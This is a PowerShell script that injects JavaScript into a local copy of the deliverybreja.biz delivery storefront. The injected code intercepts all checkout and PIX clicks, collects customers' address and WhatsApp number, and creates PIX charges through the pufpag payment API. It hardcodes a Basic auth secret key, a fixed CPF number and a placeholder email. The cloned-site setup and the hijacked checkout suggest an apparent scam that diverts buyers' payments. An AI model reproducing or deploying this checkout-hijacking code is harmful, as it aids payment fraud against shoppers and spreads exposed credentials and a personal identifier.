$path = "c:\Users\ss pc\Desktop\DELIVERY\DELIVERY\deliverybreja.biz\9345488724234\index.html"
$text = [System.IO.File]::ReadAllText($path, [System.Text.Encoding]::UTF8)

# Remove the old script
$scriptStartIdx = $text.LastIndexOf("<script>`n  document.addEventListener('click', async function(e) {")
if ($scriptStartIdx -eq -1) {
    $scriptStartIdx = $text.LastIndexOf("<script>`r`n  document.addEventListener('click', async function(e) {")
}

if ($scriptStartIdx -ge 0) {
    $text = $text.Substring(0, $scriptStartIdx)
}

$newScript = @"
<script>
  window.DO_PUFPAG = async function(total, amountInCents, FASTSOFT_AUTH) {
      var rua = document.getElementById('checkout-rua').value;
      var num = document.getElementById('checkout-num').value;
      var bairro = document.getElementById('checkout-bairro').value;
      var tel = document.getElementById('checkout-tel').value;
      
      if(!rua || !num || !bairro || !tel) {
          alert('Por favor, preencha todos os campos do endereço e o seu WhatsApp.');
          return;
      }
      
      var enderecoCompleto = rua + ', ' + num + ' - ' + bairro + ' (Whats: ' + tel + ')';
      
      document.getElementById('checkout-modal-inner').innerHTML = '<h2 style="color:#333;margin-bottom:15px;font-size:20px;font-weight:bold;">Aguarde...</h2><p style="color:#666;">Gerando seu PIX seguro...</p>';
      
      var payload = {
          amount: amountInCents,
          paymentMethod: 'pix',
          customer: {
              name: 'Cliente Delivery',
              email: 'cliente@expressze.lat',
              document: { number: '33512403840', type: 'CPF' },
              phone: tel.replace(/\D/g, '') || '11999999999'
          },
          items: [{
              title: 'Pedido Delivery',
              unitPrice: amountInCents,
              quantity: 1,
              description: 'Endereço: ' + enderecoCompleto,
              tangible: false
          }],
          pix: { expiresInDays: 1 }
      };
      
      try {
          var res = await fetch('https://api.pufpag.com/v1/transactions', {
              method: 'POST',
              headers: {
                  'Authorization': FASTSOFT_AUTH,
                  'Content-Type': 'application/json',
                  'Idempotency-Key': Math.random().toString(36).substring(2) + Date.now().toString(36)
              },
              body: JSON.stringify(payload)
          });
          var data = await res.json();
          var tx = data.transaction || data.data || data;
          var qrcode = (tx.pix && tx.pix.qrcode) || tx.qrCode || (tx.pix && tx.pix.qrCode);
          var qrcodeText = (tx.pix && tx.pix.qrcodeText) || tx.qrCodeText || (tx.pix && tx.pix.qrCodeText) || qrcode;
          
          if(qrcode) {
              var qrcodeImg = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(qrcode);
              var successHtml = '<h2 style="color:#333;margin-bottom:15px;font-size:20px;font-weight:bold;">Pague com PIX</h2>' +
                  '<img src="' + qrcodeImg + '" style="max-width:250px;width:100%;margin:0 auto 15px auto;display:block;" />' +
                  '<p style="font-size:14px;color:#666;margin-bottom:15px;word-break:break-all;">' + qrcodeText + '</p>' +
                  '<button onclick="navigator.clipboard.writeText(\'' + qrcodeText + '\'); alert(\'Código Copiado!\');" style="background:#10b981;color:#fff;border:none;padding:12px 20px;border-radius:8px;font-weight:bold;cursor:pointer;width:100%;margin-bottom:10px;">Copiar Código PIX</button>' +
                  '<button onclick="document.getElementById(\'pix-checkout-modal\').remove();" style="background:#ef4444;color:#fff;border:none;padding:12px 20px;border-radius:8px;font-weight:bold;cursor:pointer;width:100%;">Fechar / Finalizar</button>';
              document.getElementById('checkout-modal-inner').innerHTML = successHtml;
          } else {
              alert('Erro ao obter o QR Code do PIX. Tente novamente.');
              document.getElementById('pix-checkout-modal').remove();
          }
      } catch(err) {
          console.error('Erro PUFPAG:', err);
          alert('Erro de conexão ao gerar PIX.');
          document.getElementById('pix-checkout-modal').remove();
      }
  };

  document.addEventListener('click', async function(e) {
      var el = e.target;
      var clickedPix = false;
      while(el && el !== document.body) {
          var text = (el.innerText || el.textContent || '').trim().toLowerCase();
          if (text === 'pix' || text === 'pagar com pix' || text === 'finalizar pedido' || el.closest('[href="/checkout"]') || el.closest('[href="/9345488724234/checkout"]')) {
              clickedPix = true;
              break;
          }
          el = el.parentElement;
      }
      
      if (clickedPix) {
          e.preventDefault();
          e.stopPropagation();
          
          var cartStr = localStorage.getItem('cart-storage') || sessionStorage.getItem('cart-storage');
          var total = 0;
          if(cartStr) {
              try {
                  var cart = JSON.parse(cartStr);
                  var subtotal = cart.state.items.reduce(function(acc, item) { return acc + (item.finalPrice * item.quantity); }, 0);
                  total = subtotal;
                  if(subtotal > 0 && subtotal < 29.9) total += 8.7; // Delivery fee
              } catch(err){}
          }
          
          if(total <= 0) {
              alert('Carrinho vazio ou valor inválido para gerar pedido.');
              return;
          }
          
          var amountInCents = Math.round(total * 100);
          var FASTSOFT_AUTH = 'Basic a3BfMzJmMzAwODg1MWM4ZDExOGNhM2U1MTI0YTQzNjhmOGZlZmU2MDRmYTg4NjU5ZTQ4MWE2YjgzZTA3ZDIyYmNkMzprc183MTUwNTc1YTUwNzZmYjNlZjQzODY1Nzk4NTg2NDIyMGIxNTM4M2E3NWE2MGIyN2YzZTYwNzk3MTQ0YzM3NmFh';
          
          var modalHtml = '<div id="pix-checkout-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;">' +
              '<div id="checkout-modal-inner" style="background:#fff;padding:30px;border-radius:15px;text-align:left;max-width:400px;width:100%;">' +
              '<h2 style="color:#333;margin-bottom:15px;font-size:20px;font-weight:bold;text-align:center;">Endereço de Entrega</h2>' +
              '<p style="color:#666;font-size:14px;margin-bottom:15px;text-align:center;">Preencha para onde vamos enviar suas bebidas:</p>' +
              '<input type="text" id="checkout-rua" placeholder="Nome da Rua" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:5px;box-sizing:border-box;" />' +
              '<input type="text" id="checkout-num" placeholder="Número / Complemento" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:5px;box-sizing:border-box;" />' +
              '<input type="text" id="checkout-bairro" placeholder="Bairro" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:5px;box-sizing:border-box;" />' +
              '<input type="tel" id="checkout-tel" placeholder="Seu WhatsApp (Ex: 11999999999)" style="width:100%;padding:10px;margin-bottom:20px;border:1px solid #ccc;border-radius:5px;box-sizing:border-box;" />' +
              '<button onclick="window.DO_PUFPAG('+total+', '+amountInCents+', \''+FASTSOFT_AUTH+'\')" style="background:#f59e0b;color:#111;border:none;padding:12px 20px;border-radius:8px;font-weight:bold;cursor:pointer;width:100%;margin-bottom:10px;">Ir para Pagamento PIX</button>' +
              '<button onclick="document.getElementById(\'pix-checkout-modal\').remove();" style="background:#ccc;color:#333;border:none;padding:12px 20px;border-radius:8px;font-weight:bold;cursor:pointer;width:100%;">Cancelar</button>' +
              '</div></div>';
          
          document.body.insertAdjacentHTML('beforeend', modalHtml);
      }
  }, true);
</script>
</body>
</html>
"@

$text = $text + $newScript

[System.IO.File]::WriteAllText($path, $text, [System.Text.Encoding]::UTF8)

# Apply to root as well
$pathRoot = "c:\Users\ss pc\Desktop\DELIVERY\DELIVERY\deliverybreja.biz\index.html"
if (Test-Path $pathRoot) {
    $textRoot = [System.IO.File]::ReadAllText($pathRoot, [System.Text.Encoding]::UTF8)
    $scriptStartIdxRoot = $textRoot.LastIndexOf("<script>`n  document.addEventListener('click', async function(e) {")
    if ($scriptStartIdxRoot -eq -1) { $scriptStartIdxRoot = $textRoot.LastIndexOf("<script>`r`n  document.addEventListener('click', async function(e) {") }
    if ($scriptStartIdxRoot -ge 0) { $textRoot = $textRoot.Substring(0, $scriptStartIdxRoot) }
    $textRoot = $textRoot + $newScript
    [System.IO.File]::WriteAllText($pathRoot, $textRoot, [System.Text.Encoding]::UTF8)
}
